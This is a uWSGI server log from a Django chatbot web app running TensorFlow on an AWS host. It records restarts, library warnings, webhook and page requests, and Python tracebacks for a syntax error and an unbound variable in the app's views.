uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 13139, cores: 1)
2020-10-21 07:51:29.459994: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-10-21 07:51:29.460028: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-10-21 07:51:37.859949: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-10-21 07:51:37.859990: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-10-21 07:51:37.860010: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-10-21 07:51:37.860249: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-10-21 07:51:37.884258: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199825000 Hz
2020-10-21 07:51:37.884652: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x564551d527f0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-10-21 07:51:37.884671: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-10-21 07:51:38.170154: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-21 07:51:38.171568: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-21 07:51:38.172938: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 13139|app: 0|req: 1/1] 220.68.167.158 () {52 vars in 911 bytes} [Wed Oct 21 07:51:29 2020] GET / => generated 1365 bytes in 9486 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 13139|app: 0|req: 2/2] 220.68.167.158 () {52 vars in 916 bytes} [Wed Oct 21 07:51:42 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 13139|app: 0|req: 3/3] 66.249.83.201 () {42 vars in 541 bytes} [Wed Oct 21 07:51:47 2020] POST /webhook/ => generated 115 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 13139|app: 0|req: 4/4] 66.249.83.203 () {42 vars in 541 bytes} [Wed Oct 21 07:51:58 2020] POST /webhook/ => generated 115 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 13139|app: 0|req: 5/5] 66.249.83.205 () {42 vars in 541 bytes} [Wed Oct 21 07:52:01 2020] POST /webhook/ => generated 115 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 13139|app: 0|req: 6/6] 66.249.83.201 () {42 vars in 541 bytes} [Wed Oct 21 07:52:02 2020] POST /webhook/ => generated 115 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 13139|app: 0|req: 7/7] 66.249.83.203 () {42 vars in 543 bytes} [Wed Oct 21 07:52:06 2020] POST /webhook/ => generated 115 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 13139|app: 0|req: 8/8] 66.249.83.201 () {42 vars in 543 bytes} [Wed Oct 21 07:52:13 2020] POST /webhook/ => generated 115 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 13139|app: 0|req: 9/9] 66.249.83.203 () {42 vars in 541 bytes} [Wed Oct 21 07:52:17 2020] POST /webhook/ => generated 115 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 13139|app: 0|req: 10/10] 66.249.83.201 () {42 vars in 541 bytes} [Wed Oct 21 07:52:36 2020] POST /webhook/ => generated 115 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 13139|app: 0|req: 11/11] 66.249.83.201 () {42 vars in 543 bytes} [Wed Oct 21 07:52:53 2020] POST /webhook/ => generated 115 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 13139|app: 0|req: 12/12] 66.249.83.201 () {42 vars in 541 bytes} [Wed Oct 21 07:53:05 2020] POST /webhook/ => generated 115 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 13139|app: 0|req: 13/13] 66.249.83.203 () {42 vars in 541 bytes} [Wed Oct 21 07:53:07 2020] POST /webhook/ => generated 115 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 13139|app: 0|req: 14/14] 66.249.83.205 () {42 vars in 541 bytes} [Wed Oct 21 07:53:11 2020] POST /webhook/ => generated 115 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 13139|app: 0|req: 15/15] 66.249.83.201 () {42 vars in 543 bytes} [Wed Oct 21 07:53:14 2020] POST /webhook/ => generated 115 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 13139|app: 0|req: 16/16] 220.68.167.158 () {52 vars in 921 bytes} [Wed Oct 21 07:53:42 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 13139|app: 0|req: 17/17] 66.249.83.203 () {42 vars in 543 bytes} [Wed Oct 21 07:54:02 2020] POST /webhook/ => generated 115 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 13139|app: 0|req: 18/18] 220.68.167.158 () {52 vars in 921 bytes} [Wed Oct 21 07:54:26 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 13139|app: 0|req: 19/19] 66.102.6.221 () {42 vars in 540 bytes} [Wed Oct 21 07:55:42 2020] POST /webhook/ => generated 115 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Oct 22 04:30:56 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Oct  8 2020, 12:12:24)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55d221691cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55d221691cf0 pid: 1701 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 1701, cores: 1)
2020-10-22 04:52:05.897260: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-10-22 04:52:05.897308: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-10-22 04:52:17.829427: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-10-22 04:52:17.829458: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-10-22 04:52:17.829480: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-10-22 04:52:17.829704: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-10-22 04:52:17.868750: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-10-22 04:52:17.869154: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x55d22657ce80 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-10-22 04:52:17.869173: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-10-22 04:52:18.496019: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-22 04:52:18.497529: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-22 04:52:18.498934: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 1701|app: 0|req: 1/1] 167.248.133.51 () {30 vars in 325 bytes} [Thu Oct 22 04:52:04 2020] GET / => generated 1365 bytes in 14689 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 1701|app: 0|req: 2/2] 220.68.167.158 () {50 vars in 861 bytes} [Thu Oct 22 04:54:07 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /favicon.ico
[pid: 1701|app: 0|req: 3/3] 220.68.167.158 () {48 vars in 779 bytes} [Thu Oct 22 04:54:08 2020] GET /favicon.ico => generated 2328 bytes in 7 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 1701|app: 0|req: 4/4] 220.68.167.158 () {52 vars in 914 bytes} [Thu Oct 22 04:54:09 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 1701|app: 0|req: 5/5] 220.68.167.158 () {52 vars in 916 bytes} [Thu Oct 22 04:54:09 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 1701|app: 0|req: 6/6] 66.249.84.9 () {42 vars in 539 bytes} [Thu Oct 22 04:54:20 2020] POST /webhook/ => generated 115 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 1701|app: 0|req: 7/7] 66.249.84.9 () {42 vars in 539 bytes} [Thu Oct 22 05:00:48 2020] POST /webhook/ => generated 115 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Oct 22 05:06:26 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Oct  8 2020, 12:12:24)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x557cbbf2dd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x557cbbf2dd00 pid: 1905 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 1905, cores: 1)
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 73
    }
    ^
SyntaxError: invalid syntax
[pid: 1905|app: 0|req: 1/1] 220.68.167.158 () {52 vars in 911 bytes} [Thu Oct 22 05:06:57 2020] GET / => generated 102677 bytes in 74 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 73
    }
    ^
SyntaxError: invalid syntax
[pid: 1905|app: 0|req: 2/2] 220.68.167.158 () {54 vars in 942 bytes} [Thu Oct 22 05:07:26 2020] GET / => generated 102814 bytes in 64 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 73
    }
    ^
SyntaxError: invalid syntax
[pid: 1905|app: 0|req: 3/3] 220.68.167.158 () {54 vars in 942 bytes} [Thu Oct 22 05:07:28 2020] GET / => generated 102814 bytes in 64 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Oct 22 05:08:24 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Oct  8 2020, 12:12:24)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55743eab9d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55743eab9d00 pid: 1909 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 1909, cores: 1)
2020-10-22 05:08:29.473284: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-10-22 05:08:29.473320: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-10-22 05:08:37.895960: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-10-22 05:08:37.895992: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-10-22 05:08:37.896007: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-10-22 05:08:37.896224: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-10-22 05:08:37.920757: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-10-22 05:08:37.921103: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x5574439a5970 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-10-22 05:08:37.921119: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-10-22 05:08:38.208862: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-22 05:08:38.210279: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-22 05:08:38.211646: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 1909|app: 0|req: 1/1] 220.68.167.158 () {54 vars in 942 bytes} [Thu Oct 22 05:08:29 2020] GET / => generated 1365 bytes in 9508 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 1909|app: 0|req: 2/2] 220.68.167.158 () {52 vars in 916 bytes} [Thu Oct 22 05:09:14 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
['', '', '']
['', '', '']
[[31, 441, 13]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0   0  31 441  13]]
2020-10-22 05:09:30.978517: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-10-22 05:09:31.330366: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-22 05:09:31.331849: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-22 05:09:31.333303: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
95.98%   .

Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 49, in webhook
    return start(queryText)
  File "./haniumapp/views.py", line 80, in start
    sum+=int(score)
UnboundLocalError: local variable 'sum' referenced before assignment
[pid: 1909|app: 0|req: 3/3] 66.249.84.11 () {42 vars in 542 bytes} [Thu Oct 22 05:09:26 2020] POST /webhook/ => generated 67879 bytes in 5396 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
['', '', '']
['', '', '']
[[31, 441, 13]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0   0  31 441  13]]
95.98%   .

Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 49, in webhook
    return start(queryText)
  File "./haniumapp/views.py", line 80, in start
    sum+=int(score)
UnboundLocalError: local variable 'sum' referenced before assignment
[pid: 1909|app: 0|req: 4/4] 66.249.84.11 () {42 vars in 542 bytes} [Thu Oct 22 05:09:38 2020] POST /webhook/ => generated 67879 bytes in 102 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Oct 22 05:12:46 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Oct  8 2020, 12:12:24)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x56313eac4d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x56313eac4d00 pid: 1997 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
